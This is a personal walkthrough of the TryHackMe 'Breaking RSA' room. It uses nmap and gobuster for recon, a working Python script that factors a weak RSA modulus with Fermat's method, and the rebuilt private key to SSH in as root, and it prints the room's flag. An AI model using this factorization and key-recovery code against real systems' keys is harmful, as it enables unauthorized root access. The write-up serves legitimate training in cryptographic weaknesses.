# Breaking RSA 

**Platform:** TryHackMe  
**Date:** 2026-08-29  
**Difficulty:** Easy  
**Category:** Cryptography / RSA / Linux  
**Room URL:** [https://tryhackme.com/room/breakrsa](https://tryhackme.com/room/breakrsa)  
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

This room was about breaking a badly generated RSA key.

The organization in the challenge was using a deprecated cryptography library that generated RSA keys where the two prime numbers, `p` and `q`, were **way too close together**.

Normally, factoring the RSA modulus `n = p × q` is extremely difficult. But when `p` and `q` are close, **Fermat's factorization method** can factor `n` much more efficiently.

Once I recovered `p` and `q`, I could calculate the private exponent `d`, rebuild the RSA private key, and use it to SSH into the target as `root`.

Basically:

```text
Public RSA key
      ↓
Extract n and e
      ↓
Factor n using Fermat
      ↓
Recover p and q
      ↓
Calculate d
      ↓
Rebuild private key
      ↓
SSH as root
      ↓
Get flag 🚩
```

---

# 🔍 Reconnaissance

As always, I started with recon.

### Nmap Scan

I first scanned the target to see what ports and services were available.

```bash
nmap -sC -sV <TARGET_IP>
```

The important result was that **SSH was exposed on port 22**, along with the web server.

The SSH service was interesting because if I could somehow recover a valid private key, I could potentially use it to access the machine.

Since there was also a web server, I decided to investigate that next.

---

# 🧭 Steps I Took

## Step 1 — Enumerating the Web Server

I opened the web server in my browser and then used Gobuster to look for hidden directories.

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

After letting the scan run, I found:

```text
/development
```

I opened the directory in my browser:

```text
http://<TARGET_IP>/development/
```

There were several files available for download.

One of the important files was:

```text
id_rsa.pub
```

### Why it matters

An `id_rsa.pub` file contains an **RSA public key**.

Normally, having someone's public key isn't enough to SSH into their account. That's kind of the point of public-key cryptography.

But the challenge description had already given me a huge clue: the RSA key generation was broken.

So instead of trying to find a password, I started looking at the RSA mathematics.

---

# Step 2 — Understanding the RSA Public Key

I downloaded the `id_rsa.pub` file and inspected it.

The public key contains two important values:

```text
n = modulus
e = public exponent
```

RSA generates the modulus using:

```text
n = p × q
```

where `p` and `q` are large prime numbers.

The security of RSA depends heavily on the fact that factoring `n` back into `p` and `q` is extremely difficult when the primes are properly generated.

But this challenge had a weakness:

> `p` and `q` were unusually close to each other.

That is exactly the situation where **Fermat's factorization method** becomes useful.

---

# Step 3 — Using Fermat's Factorization

The basic idea behind Fermat factorization is:

```text
n = a² - b²
```

which can be rewritten as:

```text
n = (a + b)(a - b)
```

So if I can find values of `a` and `b`, I can recover:

```text
p = a + b
q = a - b
```

When `p` and `q` are close together, `a` is close to `√n`, making this process much faster.

I used Python to automate the calculations.

The script imported the RSA public key, extracted `n`, factored it into `p` and `q`, and then calculated the private exponent.

```python
from Crypto.PublicKey import RSA
from gmpy2 import isqrt, invert, lcm

def factorize(n):
    if n % 2 == 0:
        return n // 2, 2

    a = isqrt(n)

    if a * a == n:
        return a, a

    while True:
        a += 1
        b_squared = a * a - n
        b = isqrt(b_squared)

        if b * b == b_squared:
            return a + b, a - b

def get_private_key(e, p, q):
    return invert(e, lcm(p - 1, q - 1))

with open("id_rsa.pub", "r") as file:
    public_key = RSA.import_key(file.read())

n = public_key.n
e = public_key.e

p, q = factorize(n)

d = get_private_key(e, p, q)

private_key = RSA.construct((n, e, int(d)))

with open("id_rsa", "wb") as file:
    file.write(private_key.export_key("PEM"))

print("p =", p)
print("q =", q)
print("d =", d)
print("Private key saved as id_rsa")
```

### What the script was doing

First, it loaded the public key:

```python
RSA.import_key(file.read())
```

Then it extracted:

```python
n = public_key.n
e = public_key.e
```

The important part was:

```python
p, q = factorize(n)
```

This recovered the two prime factors of the RSA modulus.

Once I had `p` and `q`, I could calculate the private exponent:

```python
d = get_private_key(e, p, q)
```

The private key was then reconstructed and saved as:

```text
id_rsa
```

### Why this works

RSA's private exponent is calculated from the public exponent and the factors of `n`.

So once `p` and `q` are known, the attacker can derive the private key.

That means the entire RSA key pair is effectively compromised.

---

# Step 4 — Fixing the Private Key Permissions

Before using the private key with SSH, I changed its permissions:

```bash
chmod 400 id_rsa
```

This makes the private key readable only by its owner.

SSH will often reject private keys that have permissions that are too open.

---

# Step 5 — SSH Into the Machine

Now that I had recovered the private key, I tried logging into the target as `root`:

```bash
ssh root@<TARGET_IP> -i id_rsa
```

And it worked. 🎉

I was now inside the machine as:

```bash
root
```

At this point, the cryptography part of the challenge was basically over.

---

# Step 6 — Getting the Flag

Once I had root access, I looked for the flag.

```bash
ls
```

I found the flag file and read it with:

```bash
cat flag
```

And that gave me the room's flag.

🚩 **Boom. RSA was broken and I was root.**

---

# 🛠 Commands Used

|Command / Tool|What It Does|
|---|---|
|`nmap -sC -sV <TARGET_IP>`|Scans the target and identifies open ports and services.|
|`gobuster dir -u ...`|Searches the web server for hidden directories and files.|
|`python3 rsa.py`|Runs the Python script used to factor the RSA modulus and generate the private key.|
|`chmod 400 id_rsa`|Restricts the private key so only the owner can read it.|
|`ssh root@<TARGET_IP> -i id_rsa`|Uses the recovered RSA private key to authenticate to SSH as root.|
|`ls`|Lists files and directories.|
|`cat flag`|Displays the contents of the flag file.|

---

# 🚩 Flags Found

| Flag      | Value                                 |
| --------- | ------------------------------------- |
| Root Flag | `breakingRSAissuperfun20220809134031` |

---

## 📎 Resources Used

- TryHackMe — **Breaking RSA**
    
- PyCryptodome RSA documentation
    
- Fermat's Factorization method
    
- Python
    

---
